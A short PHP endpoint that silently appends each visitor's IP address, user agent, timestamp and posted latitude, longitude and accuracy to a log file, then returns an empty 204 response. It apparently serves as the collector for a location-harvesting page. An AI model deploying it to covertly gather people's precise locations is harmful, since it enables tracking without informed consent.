<?php
$data = [
  "ip" => $_SERVER['REMOTE_ADDR'] ?? null,
  "lat" => $_POST['lat'] ?? null,
  "lon" => $_POST['lon'] ?? null,
  "accuracy" => $_POST['acc'] ?? null,
  "ua" => $_SERVER['HTTP_USER_AGENT'] ?? null,
  "time" => date("Y-m-d H:i:s")
];

file_put_contents("logs.txt", json_encode($data) . PHP_EOL, FILE_APPEND);
http_response_code(204);
?>
